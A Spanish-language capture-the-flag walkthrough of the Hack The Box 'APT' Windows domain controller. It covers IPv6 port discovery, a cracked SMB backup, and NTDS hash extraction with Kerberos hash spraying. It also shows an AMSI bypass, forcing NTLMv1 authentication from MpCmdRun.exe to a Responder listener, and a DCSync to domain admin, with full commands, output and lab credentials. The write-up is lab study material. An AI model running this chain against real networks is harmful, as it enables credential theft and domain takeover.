>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.129.96.60 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-05 10:38 EST
Nmap scan report for 10.129.96.60
Host is up (0.060s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.59 seconds
```

>Vamos a usar **IOXIDResolver.py** para obtener la dirección IPv6 Link-Local de la máquina víctima por RPC para poder hacer un escaneo de nmap que quizas tenga más puertos: https://raw.githubusercontent.com/mubix/IOXIDResolver/refs/heads/main/IOXIDResolver.py

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ python3 IOXIDResolver.py -t 10.129.96.60
[*] Retrieving network interface of 10.129.96.60
Address: apt
Address: 10.129.96.60
Address: dead:beef::61d6:d554:6acf:cfa7
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::1ce
```

>Vemos que responden todas las direcciones IPv6:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ ping6 dead:beef::1ce
PING dead:beef::1ce (dead:beef::1ce) 56 data bytes
64 bytes from dead:beef::1ce: icmp_seq=1 ttl=63 time=61.2 ms
64 bytes from dead:beef::1ce: icmp_seq=2 ttl=63 time=62.9 ms
64 bytes from dead:beef::1ce: icmp_seq=3 ttl=63 time=101 ms
64 bytes from dead:beef::1ce: icmp_seq=4 ttl=63 time=62.0 ms
^C
--- dead:beef::1ce ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3007ms
rtt min/avg/max/mdev = 61.180/71.671/100.632/16.731 ms
```

>Realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima pero ahora por **IPv6** para posiblemente **evadir** ciertas reglas de **firewall** mal configuradas que solo apliquen a IPv4:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV -6 dead:beef::1ce
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-05 10:52 EST
Nmap scan report for dead:beef::1ce
Host is up (0.061s latency).
Not shown: 65512 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
80/tcp    open  http         Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-01-05 15:53:30Z)
135/tcp   open  msrpc        Microsoft Windows RPC
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc        Microsoft Windows RPC
49673/tcp open  msrpc        Microsoft Windows RPC
49688/tcp open  msrpc        Microsoft Windows RPC
52826/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: APT; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.92 seconds
```

>Vemos por **SMB** que hay una **share** que podemos acceder con **NULL Session**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ nxc smb dead:beef::1ce -u '' -p '' --shares
SMB         dead:beef::1ce  445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         dead:beef::1ce  445    APT              [+] htb.local\: 
SMB         dead:beef::1ce  445    APT              [*] Enumerated shares
SMB         dead:beef::1ce  445    APT              Share           Permissions     Remark
SMB         dead:beef::1ce  445    APT              -----           -----------     ------
SMB         dead:beef::1ce  445    APT              backup          READ            
SMB         dead:beef::1ce  445    APT              IPC$                            Remote IPC
SMB         dead:beef::1ce  445    APT              NETLOGON                        Logon server share 
SMB         dead:beef::1ce  445    APT              SYSVOL                          Logon server share 
                                                                                                         
```

>Obtenemos un archivo de **backup** al conectarnos a la share:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ smbclient -U "" -N '\\dead:beef::1ce\backup'                                        
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Sep 24 03:30:52 2020
  ..                                  D        0  Thu Sep 24 03:30:52 2020
  backup.zip                          A 10650961  Thu Sep 24 03:30:32 2020

		5114623 blocks of size 4096. 2634563 blocks available
smb: \> get backup.zip
getting file \backup.zip of size 10650961 as backup.zip (3644.5 KiloBytes/sec) (average 3644.5 KiloBytes/sec)
smb: \> exit
```

>**Crackeamos** la contraseña del **zip**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ zip2john backup.zip > backup_hash
ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB ts=9CCA cs=acd0 type=8
ver 2.0 backup.zip/Active Directory/ntds.jfm PKZIP Encr: cmplen=342, decmplen=16384, crc=2A393785 ts=9CCA cs=2a39 type=8
ver 2.0 backup.zip/registry/ is not encrypted, or stored with non-handled compression type
ver 2.0 backup.zip/registry/SECURITY PKZIP Encr: cmplen=8522, decmplen=262144, crc=9BEBC2C3 ts=9AC6 cs=9beb type=8
ver 2.0 backup.zip/registry/SYSTEM PKZIP Encr: cmplen=2157644, decmplen=12582912, crc=65D9BFCD ts=9AC6 cs=65d9 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ john -w=/usr/share/wordlists/rockyou.txt backup_hash             
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iloveyousomuch   (backup.zip)     
1g 0:00:00:00 DONE (2026-01-05 11:03) 50.00g/s 409600p/s 409600c/s 409600C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

>Vemos que el backup tiene un **NTDS.dit** con las registry hives **SYSTEM** y **security**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ tree                 
.
├── Active Directory
│   ├── ntds.dit
│   └── ntds.jfm
├── backup_hash
├── backup.zip
├── IOXIDResolver.py
└── registry
    ├── SECURITY
    └── SYSTEM
```

>Vamos a extraer los **hashes** **NTLM**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL > hashesNTLM               
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ cat hashesNTLM| grep Administrator
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Administrator:aes256-cts-hmac-sha1-96:d35ae5b9bf5ee7f6c4480bb73b3d8235f022b4fd504c7a3e35b9101b4c40e1d4
Administrator:aes128-cts-hmac-sha1-96:26c50872286f2847fc85cf611871106d
Administrator:des-cbc-md5:c767fd15d55eabef
```

>Vamos a crear una lista con los usuarios extraidos:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ cat hashesNTLM | grep "aad3b435b51404eeaad3b435b51404ee" | awk {'print $1'} FS=":" > users
```

>Agregamos los nombres de dominio encontrados en el escaneo al resolutor local para poder resolver sus nombres DNS:

```bash
┌──(kali㉿jbkira)-[~]
└─$ echo "dead:beef::1ce apt.htb.local htb.local apt" >> /etc/hosts
```

>Ahora vamos a usarla con **kerbrute** para ver que usuarios existen:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ kerbrute userenum -d htb.local users --dc apt -t 300            

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/05/26 - Ronnie Flathers @ropnop

2026/01/05 11:23:01 >  Using KDC(s):
2026/01/05 11:23:01 >  	apt:88

2026/01/05 11:23:07 >  [+] VALID USERNAME:	Administrator@htb.local
2026/01/05 11:23:07 >  [+] VALID USERNAME:	APT$@htb.local
2026/01/05 11:23:12 >  [+] VALID USERNAME:	henry.vinson@htb.local
2026/01/05 11:23:38 >  Done! Tested 2000 usernames (3 valid) in 36.137 seconds
```

>Hashes de esos usuarios:

```
henry.vinson:2de80758521541d19cabba480b260e8f
APT$:b300272f1cdab4469660d55fe59415cb       
Administrator:2b576acbe6bcfda7294d6bd18041b8fe
```

>Probamos todos pero ninguno es válido:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ nxc smb dead:beef::1ce -u 'Administrator' -H '2b576acbe6bcfda7294d6bd18041b8fe' 
SMB         dead:beef::1ce  445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         dead:beef::1ce  445    APT              [-] htb.local\Administrator:2b576acbe6bcfda7294d6bd18041b8fe STATUS_LOGON_FAILURE 
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ nxc smb dead:beef::1ce -u 'APT$' -H 'b300272f1cdab4469660d55fe59415cb'         
SMB         dead:beef::1ce  445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         dead:beef::1ce  445    APT              [-] htb.local\APT$:b300272f1cdab4469660d55fe59415cb STATUS_LOGON_FAILURE 
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ nxc smb dead:beef::1ce -u 'henry.vinson' -H '2de80758521541d19cabba480b260e8f' 
SMB         dead:beef::1ce  445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         dead:beef::1ce  445    APT              [-] htb.local\henry.vinson:2de80758521541d19cabba480b260e8f STATUS_LOGON_FAILURE 
```

>Usaremos **pykerbrute** pero vamos a modificarlo para que opere por **IPv6**: https://github.com/3gstudent/pyKerbrute

>Modificamos la **función main** con esto:

```python
if __name__ == '__main__':
	kdc_a = 'APT'
	user_realm = 'HTB.LOCAL'
	username = 'henry.vinson'
	hashes = open('hashes.txt', 'r').readlines()
	for line in hashes:
		user_key = (RC4_HMAC, line.strip('\r\n').decode('hex'))
		passwordspray_tcp(user_realm, username, user_key, kdc_a,
line.strip('\r\n'))
```

>Y cambiamos la flag **AF_INET** del socket por **AF_INET6**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ sed -i "s/AF_INET/AF_INET6/g" pyKerbrute/ADPwdSpray.py
```

>Creamos una lista con solo los hashes NTLM también:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ cat hashesNTLM | grep "aad3b435b51404eeaad3b435b51404ee" | awk {'print $4'} FS=":" > allNTLM
```

>Usamos la herramienta y obtenemos el hash NTLM correcto: `henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb`

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ python2 pyKerbrute/ADPwdSpray.py
[+] Valid Login: henry.vinson: e53d87d42adaa3ca32bdb34a876cbffb
```

>Comprobamos con netexec el hash:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ nxc smb dead:beef::1ce -u 'henry.vinson' -H 'e53d87d42adaa3ca32bdb34a876cbffb' 
SMB         dead:beef::1ce  445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         dead:beef::1ce  445    APT              [+] htb.local\henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb 
```

>Vamos a enumerar el registro **HKU** con **reg.py** de impacket:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU 2>/dev/null
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU
HKU\Console
HKU\Control Panel
HKU\Environment
HKU\Keyboard Layout
HKU\Network
HKU\Software
HKU\System
HKU\Volatile Environment
```

>Enumeramos **software** en el registro **HKU**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU\\Software 2>/dev/null
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\Software
HKU\Software\GiganticHostingManagementSystem
HKU\Software\Microsoft
HKU\Software\Policies
HKU\Software\RegisteredApplications
HKU\Software\Sysinternals
HKU\Software\VMware, Inc.
HKU\Software\Wow6432Node
HKU\Software\Classes
```

>Al enumerar **GiganticHostingManagementSystem** vemos credenciales: `henry.vinson_adm:G1#Ny5@2dvht`

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt query -keyName HKU\\Software\\GiganticHostingManagementSystem 2>/dev/null
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\Software\GiganticHostingManagementSystem
	UserName	REG_SZ	henry.vinson_adm
	PassWord	REG_SZ	G1#Ny5@2dvht
```

>Probamos las credenciales y vemos que son válidas:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ nxc smb dead:beef::1ce -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht' 
SMB         dead:beef::1ce  445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         dead:beef::1ce  445    APT              [+] htb.local\henry.vinson_adm:G1#Ny5@2dvht
```

>Entramos por **WinRM** y obtenemos la primera flag:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ nxc winrm dead:beef::1ce -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht' 
WINRM       dead:beef::1ce  5985   APT              [*] Windows 10 / Server 2016 Build 14393 (name:APT) (domain:htb.local) 
WINRM       dead:beef::1ce  5985   APT              [+] htb.local\henry.vinson_adm:G1#Ny5@2dvht (Pwn3d!)
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ evil-winrm -i apt -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> cat ..\Desktop\user.txt
0a35e093123d69a5c962e55752640b80
```

>Hacemos un Bypass del AMSI:

```bash
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> Bypass-4MSI
                                        
Info: Patching 4MSI, please be patient...
                                        
[+] Success!
                                        
Info: Patching ETW, please be patient ..
                                        
[+] Success!
```

>Usamos **seatbelt** para ver un path de Escalada de Privilegios: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe

```bash
*Evil-WinRM* PS C:\> Invoke-Binary /home/kali/Desktop/academy_tools/Seatbelt.exe -group=all

====== NTLMSettings ======

  LanmanCompatibilityLevel    : 2(Send NTLM response only)

  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : True
      ServerNegotiateSigning  : True
      LdapSigning             : 1 (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require128BitKey)
        [!] NTLM clients support NTLMv1!
      NTLMMinServerSec        : 536870912 (Require128BitKey)

        [!] NTLM services on this machine support NTLMv1!

  NTLM Auditing and Restrictions
      InboundRestrictions     : (Not defined)
      OutboundRestrictions    : (Not defined)
      InboundAuditing         : (Not defined)
      OutboundExceptions      : 
```

>Al estar **NTLMv1 habilitado** podríamos crackear los hashes facilmente para obtener las credenciales en texto plano de algún usuario, para ello ponemos en marcha un listener con responder:

```bash
┌──(kali㉿jbkira)-[~]
└─$ sudo responder -I tun0 -v --lm
```

>Forzamos una conexión a nuestro responder con **MpCmdRun.exe** ya que tenemos acceso por WinRM y obtenemos el hash:

```bash
*Evil-WinRM* PS C:\Program Files\Windows Defender> .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.71\test
Scan starting...
CmdTool: Failed with hr = 0x80508023. Check C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.log for more information
```

```bash
[+] Listening for events...

[SMB] NTLMv1 Client   : 10.129.96.60
[SMB] NTLMv1 Username : HTB\APT$
[SMB] NTLMv1 Hash     : APT$::HTB:4440AA2661D48AA90B91A354F25A6E3A7068EB95BF24B2A2:4440AA2661D48AA90B91A354F25A6E3A7068EB95BF24B2A2:3a175a1a933b0bba
```

>Si lo pones en plataformas como **crack.sh** que ya no están operativas al cabo de un tiempo te llegaría un correo diciendo que el hash crackeado es el siguiente

```
Key: d167c3238864b12f5f82feae86a7f798
```

>Así que ahora hacemos un **DCSync** con este hash y tendríamos acceso al **Administrador** del dominio:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ secretsdump.py 'htb.local/APT$@apt' -hashes ':d167c3238864b12f5f82feae86a7f798'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
Administrator:des-cbc-md5:0816d9d052239b8a
krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
krbtgt:des-cbc-md5:f8c26238c2d976bf
henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
henry.vinson:des-cbc-md5:73b6f71cae264fad
henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
APT$:aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
APT$:aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
APT$:des-cbc-md5:76c45245f104a4bf
[*] Cleaning up... 
```

>Leemos la flag al acceder como **Administrator** por **WinRM**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/APT]
└─$ evil-winrm -i apt -u Administrator -H c370bddf384a691d811ff3495e8a72e2
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
9ba8638b31b1768e28a187218b8f4984
```
